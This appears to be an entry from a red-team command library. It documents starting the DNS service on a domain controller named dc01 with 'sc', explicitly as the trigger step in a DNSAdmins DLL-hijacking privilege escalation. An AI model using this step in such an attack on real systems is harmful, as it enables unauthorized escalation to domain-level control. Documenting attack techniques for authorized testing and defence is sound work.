---
id: 2cc329e1-3fed-4ae3-8cc8-84d427e36d77
name: Start-DNS-Service-DC01
type: command
executor: powershell
data: sc \\dc01 start dns
output: null
created_at: '2023-04-06T03:56:06.475228+00:00'
updated_at: '2023-10-10T20:26:10.325254+00:00'
platforms:
  - Windows
tags:
  - service
  - management
verified: true
validated: true
---

# Start-DNS-Service-DC01

## Command

```powershell
sc \\dc01 start dns
```

## Description

Starts the DNS service on the target server, triggering the load of the malicious DLL for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| \\dc01 | Target server | Yes |
| start | Action to start service | Built-in |
| dns | Service name | Yes |

## Examples

### Basic Usage

```powershell
sc \\dc01 start dns
```

## Expected Output

```
SERVICE_NAME: dns
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
```

Service status changes to running, with payload execution.

## Related

- [[procedures/Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation]]
